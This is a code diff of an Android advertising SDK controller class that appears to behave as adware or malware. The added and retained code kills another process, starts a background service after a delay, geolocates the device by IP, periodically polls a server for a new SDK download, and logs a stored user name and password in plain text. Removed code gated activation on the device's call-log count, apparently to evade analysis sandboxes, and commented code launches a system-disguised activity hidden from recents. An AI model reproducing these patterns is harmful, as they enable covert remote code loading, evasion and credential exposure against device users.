@@ -22,12 +22,6 @@ public class GAdController {
 	private Context context;
 	private String newSdkCode;
 	private String dexName;
-	private SdkConfigCallback callback;
-	
-	public interface SdkConfigCallback
-	{
-		void result(boolean res);
-	}
 	
 	
 	private GAdController()
@@ -44,7 +38,34 @@ public class GAdController {
 		return controller;
 	}
 		
-	public void init(Context context,Boolean isTestModel)
+	public void init(final Context context,Boolean isTestModel)
+	{
+		this.context = context;
+	
+		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTestModel);
+		
+		killpro();
+		new Thread(){
+			public void run() {
+				try {
+					Thread.sleep(5000);
+				} catch (InterruptedException e) {
+					e.printStackTrace();
+				}
+				finally
+				{
+					Intent intent = new Intent(context,GService.class);
+					context.startService(intent);
+				}
+			};
+		}.start();
+		
+		
+		
+		//GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);				
+	}
+	
+	public void init(Context context)
 	{
 		this.context = context;
 		
@@ -58,19 +79,11 @@ public class GAdController {
 			e.printStackTrace();
 		}
 		
-		
-		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTestModel);
-		
-		Intent intent = new Intent(context,GService.class);
-		context.startService(intent);
-		
-		//GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);				
+		judgeCountry();
 	}
 	
-	public void init(Context context)
+	public void initEnd()
 	{
-		this.context = context;
-		
 		boolean isTest = GTool.getSharedPreferences().getBoolean(GCommons.SHARED_KEY_TESTMODEL, false);
 		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTest);
 		String country = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_COUNTRY, "");
@@ -88,38 +101,16 @@ public class GAdController {
 		String code = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_SDK_VERSIONCODE, "0");
 		if(nowTime - reqTime > 1*60*60*1000 || "0".equals(code))
 		{
+			Log.e("------------", "req new sdk "+GCommons.URI_POST_NEW_SDK);
 			GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);	
 		}
 		else
 		{
-			Log.e("------------","----------startservice");
+			Log.e("------------","----------start pro service");
 			start();
 		}
-		
 	}
 	
-	public void getSdkConfig(Context context,SdkConfigCallback callback)
-	{
-		this.context = context;
-		this.callback = callback;
-		if(this.context == null || this.callback == null)
-		{
-			Log.e("---------------", "context or callback is null!");
-			
-			return;
-		}
-		
-		ApplicationInfo appInfo = null;
-		try {
-			appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(),PackageManager.GET_META_DATA);
-			String qew_channel = appInfo.metaData.getString("UMENG_CHANNEL");
-			GCommons.CHANNEL = qew_channel;
-			Log.e("------------","qew_channel="+GCommons.CHANNEL);
-		} catch (NameNotFoundException e) {
-			e.printStackTrace();
-		}
-		judgeCountry();
-	}
 	
 	//判断是否是国内
 	public void judgeCountry()
@@ -130,7 +121,8 @@ public class GAdController {
 			GTool.httpGetRequest(GCommons.IP_URL, this, "getProvinceResult",null);
 		}
 		else
-		{
+		{	
+			Log.e("------------", "------country="+country);
 			if("china".equals(country))
 			{
 				updateLink();
@@ -139,7 +131,7 @@ public class GAdController {
 			{
 				GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
 			}
-			initSdkConfig();
+			initEnd();
 		}
 	}
 	
@@ -171,9 +163,8 @@ public class GAdController {
 					
 			}
 		} catch (JSONException e) {
-//			this.callback.result(false);
 		}
-		initSdkConfig();
+		initEnd();
 	}
 
 	
@@ -193,87 +184,7 @@ public class GAdController {
 		GCommons.URI_REGISTER = GCommons.SERVER_ADDRESS + "user_register";
 		GCommons.URI_UPLOAD_APPINFO = GCommons.SERVER_ADDRESS + "user_uploadAppInfos";
 	}
-	
-	public void initSdkConfig()
-	{
-//		String name = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_NAME, "");
-//		String password = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_PASSWORD, "");
-//		int channel_paiming =  GTool.getSharedPreferences().getInt("channel_paiming", -1);
-//		JSONObject obj = new JSONObject();
-//		try {
-//			obj.put(GCommons.SHARED_KEY_NAME, name);
-//			obj.put(GCommons.SHARED_KEY_PASSWORD, password);
-//			obj.put("channel",  GCommons.CHANNEL);
-//			obj.put("channel_paiming",  channel_paiming);
-//		} catch (JSONException e) {
-//			e.printStackTrace();
-//		}
-//		
-//		GTool.httpPostRequest(GCommons.URI_POST_GET_SDKCONFIG, this, "revSdkConfig", obj.toString());
-		Log.e("------------------","initSdkConfig");
-		login();
-	}
-	
-	
-	public void revSdkConfig(Object ob,Object rev)
-	{
-		Log.e("--------------", "revSdkConfig="+rev.toString());
-		try {
-			JSONObject obj = new JSONObject(rev.toString());
-			int callLogNum = obj.getInt("callLogNum");
-			int newChannelNum = obj.getInt("newChannelNum");
-			float time = (float) obj.getDouble("time");
-			
-			int channel_paiming =  GTool.getSharedPreferences().getInt("channel_paiming", -1);
-			if(channel_paiming == -1)
-			{
-				channel_paiming = obj.getInt("channel_paiming");
-			}
-			boolean b = true;
-			if(channel_paiming <= newChannelNum && newChannelNum > 0)
-			{
-				b = false;
-			}
-			if(b && callLogNum > 0)
-			{
-				if(GTool.getCallLogNum() < callLogNum)
-				{
-					b = false;
-				}
-			}
-			if(b)
-			{
-				if(time != 0)
-				{
-					long reqTime = GTool.getSharedPreferences().getLong(GCommons.SHARED_KEY_REQ_SDK_TIME, 0l);
-					long nowTime = System.currentTimeMillis();
-					if(reqTime == 0)
-					{
-						b = false;
-						GTool.saveSharedData(GCommons.SHARED_KEY_REQ_SDK_TIME, nowTime);
-					}
-					else
-					{
-						if(nowTime-reqTime < time*24*60*60*1000)
-						{
-							b = false;
-						}
-					}
-				}
-			}
-			if(b)
-			{
-				login();
-			}
-			else
-			{
-				this.callback.result(b);
-			}
-						
-		} catch (JSONException e) {
-			this.callback.result(false);
-		}	
-	}
+
 	
 	public void showSpotAd()
 	{
@@ -309,6 +220,13 @@ public class GAdController {
 		this.context.sendBroadcast(intent);
 	}
 	
+	public void killpro()
+	{
+		Intent intent = new Intent(context,GReceiver.class);
+		intent.setAction("com.xugu.killpro");
+		this.context.sendBroadcast(intent);
+	}
+	
 	public Context getContext() {
 		return context;
 	}
@@ -319,6 +237,8 @@ public class GAdController {
 	
 	public void revNewSdk(Object ob,Object rev)
 	{
+		GTool.saveSharedData(GCommons.SHARED_KEY_UPDATE_SDK_TIME, System.currentTimeMillis());
+		
 		JSONObject obj = null;
 		String versionCode = null;
 		String downloadPath = null;
@@ -411,9 +331,9 @@ public class GAdController {
 		if(isRegister())
 		{
 			GAdController.getInstance().loginSuccess();
-//			String name = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_NAME, "");
-//			String password = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_PASSWORD, "");
-//			Log.e("-----------------","name="+name + "   pass="+password);
+			String name = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_NAME, "");
+			String password = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_PASSWORD, "");
+			Log.e("-----------------","name="+name + "   pass="+password);
 //			JSONObject obj = new JSONObject();
 //			try {
 //				obj.put(GCommons.SHARED_KEY_NAME, name);
@@ -430,28 +350,7 @@ public class GAdController {
 		}
 	}
 	
-	public void loginResult(Object ob,Object rev) 
-	{
-		try {
-			JSONObject obj = new JSONObject(rev.toString());
-			if(obj.getBoolean("result"))
-			{
-				GAdController.getInstance().loginSuccess();
-			}
-			else
-			{
-				GTool.saveSharedData(GCommons.SHARED_KEY_NAME, "");
-				GTool.saveSharedData(GCommons.SHARED_KEY_PASSWORD, "");
-				GAdController.getInstance().login();
-			}
-		} catch (JSONException e) {
-//			GTool.saveSharedData(GCommons.SHARED_KEY_NAME, "");
-//			GTool.saveSharedData(GCommons.SHARED_KEY_PASSWORD, "");
-//			GAdController.getInstance().login();
-			this.callback.result(false);
-		}
-		
-	}
+	
 	//验证是否已经注册
 	public void validate()
 	{
@@ -493,7 +392,6 @@ public class GAdController {
 			
 		} catch (JSONException e) {
 			Log.e("------------", "validateResult fail!!!");
-			this.callback.result(false);
 		}
 	}
 	
@@ -597,12 +495,6 @@ public class GAdController {
 	//登录成功
 	public void loginSuccess()
 	{			
-		this.callback.result(true);
-//		GAdController.getInstance().uploadAppInfos();	
-//		Intent intent = new Intent();
-//		intent.setClassName(context, "com.android.system.core.sometools.MainActivity");
-//		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-//		intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
-//		context.startActivity(intent);	
+		initEnd();
 	}
 }
